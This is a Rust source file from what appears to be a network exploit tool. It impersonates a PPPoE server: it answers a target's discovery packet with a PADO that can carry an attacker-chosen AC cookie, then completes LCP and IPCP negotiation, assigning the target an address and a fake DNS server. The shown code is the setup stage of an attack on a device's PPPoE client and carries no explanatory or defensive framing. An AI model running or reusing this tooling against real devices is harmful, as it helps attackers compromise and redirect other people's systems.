use super::exploit_state::{handle_padi, ExploitState};
use super::packet_checking::{is_padi_packet, is_padr_packet};
use super::packet_creation::{
    create_lcp_conf_ack, create_lcp_conf_request, create_pado_packet, create_pads_packet,
};

use super::utils::{create_ethernet_channel, listen_for_packet};
use crate::constants;
use crate::exploit::packet_checking::{
    is_ipcp_conf_ack, is_ipcp_conf_req, is_lcp_conf_ack, is_lcp_conf_req,
};
use crate::exploit::packet_creation::{
    create_ipcp_conf_ack, create_ipcp_conf_nak, create_ipcp_conf_request,
};
use pnet::datalink::NetworkInterface;

pub fn ppp_negotiation(
    interface: &NetworkInterface,
    exploit_state: &mut ExploitState,
    ac_cookie: Option<Vec<u8>>,
) {
    // self.print_current_state(); TODO print the state

    if ac_cookie.is_some() {
        println!(
            "[+] AC cookie length: {}",
            ac_cookie.as_ref().unwrap().len()
        );
    }
    let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

    let padi = listen_for_packet(rx.as_mut(), is_padi_packet);

    handle_padi(exploit_state, &padi.unwrap());

    let pado = create_pado_packet(
        exploit_state.source_mac,
        exploit_state.target_mac,
        ac_cookie,
        exploit_state.host_uniq,
    );
    println!("[+] Sending PADO...");
    let _result = tx
        .send_to(&pado, None)
        .expect("[-] Failed to send PADO packet");
    println!("[+] Waiting for PADR...");
    let _padr = listen_for_packet(rx.as_mut(), is_padr_packet);
    // Send PADS
    println!("[+] Sending PADS");
    let pads = create_pads_packet(
        exploit_state.source_mac,
        exploit_state.target_mac,
        constants::PPPOE_SESSION_ID.to_be_bytes(),
        exploit_state.host_uniq,
    );
    let _result = tx
        .send_to(&pads, None)
        .expect("[-] Failed to send PADS packet");
}

pub fn lcp_negotiation(interface: &NetworkInterface, exploit_state: &mut ExploitState) {
    //  Create LCP Configure request

    let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

    println!("[+] Sending LCP configure request...");
    let lcp_configure = create_lcp_conf_request(
        exploit_state.source_mac,
        exploit_state.target_mac,
        0x00,
        constants::PPPOE_SESSION_ID.to_be_bytes(),
        None,
    );
    let _result = tx
        .send_to(&lcp_configure, None)
        .expect("[-] Failed to send lcp_configure packet");

    println!("[+] Waiting for LCP configure ACK...");
    let _result = listen_for_packet(rx.as_mut(), is_lcp_conf_ack);
    println!("[+] Waiting for LCP configure request...");
    let result = listen_for_packet(rx.as_mut(), is_lcp_conf_req);
    println!("[+] Sending LCP configure ACK...");
    let id = u8::from_be_bytes([result.unwrap()[23]]);
    let lcp_conf_ack = create_lcp_conf_ack(
        exploit_state.source_mac,
        exploit_state.target_mac,
        0x00,
        constants::PPPOE_SESSION_ID.to_be_bytes(),
        id,
    );
    let _result = tx
        .send_to(&lcp_conf_ack, None)
        .expect("[-] Failed to send lcp_conf_ack packet");
}

pub fn ipcp_negotiation(interface: &NetworkInterface, exploit_state: &mut ExploitState) {
    let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();
    // Send IPCP conf request
    println!("[+] Sending IPCP configure request...");
    let lcp_configure = create_ipcp_conf_request(
        exploit_state.source_mac,
        exploit_state.target_mac,
        0x00,
        constants::PPPOE_SESSION_ID.to_be_bytes(),
        constants::LCP_ID,
        constants::SOURCE_IPV4,
    );
    let _result = tx
        .send_to(&lcp_configure, None)
        .expect("[-] Failed to send IPCP configure req packet");
    // wait for Rec conf ack
    println!("[+] Waiting for IPCP configure ACK...");
    let _result = listen_for_packet(rx.as_mut(), is_ipcp_conf_ack);
    // wait for req conf
    println!("[+] Waiting for IPCP configure request...");
    let result = listen_for_packet(rx.as_mut(), is_ipcp_conf_req);
    let id = u8::from_be_bytes([result.unwrap()[23]]);
    // send nak
    println!("[+] Sending IPCP configure NAK...");
    let lcp_configure = create_ipcp_conf_nak(
        exploit_state.source_mac,
        exploit_state.target_mac,
        0x00,
        constants::PPPOE_SESSION_ID.to_be_bytes(),
        id,
        constants::TARGET_IPV4,
    );
    let _result = tx
        .send_to(&lcp_configure, None)
        .expect("[-] Failed to send IPCP configure NAK packet");
    // wait for req conf
    println!("[+] Waiting for IPCP configure request...");
    let result: Option<Vec<u8>> = listen_for_packet(rx.as_mut(), is_ipcp_conf_req);
    let id = u8::from_be_bytes([result.unwrap()[23]]);
    // send conf ack
    println!("[+] Sending IPCP configure ACK...");
    let lcp_configure = create_ipcp_conf_ack(
        exploit_state.source_mac,
        exploit_state.target_mac,
        0x00,
        constants::PPPOE_SESSION_ID.to_be_bytes(),
        id, // todo actually take it from the req
        constants::TARGET_IPV4,
        constants::FAKE_PRIMARY_DNS_SERVER,
    );
    let _result = tx
        .send_to(&lcp_configure, None)
        .expect("[-] Failed to send IPCP configure ACK packet");
}
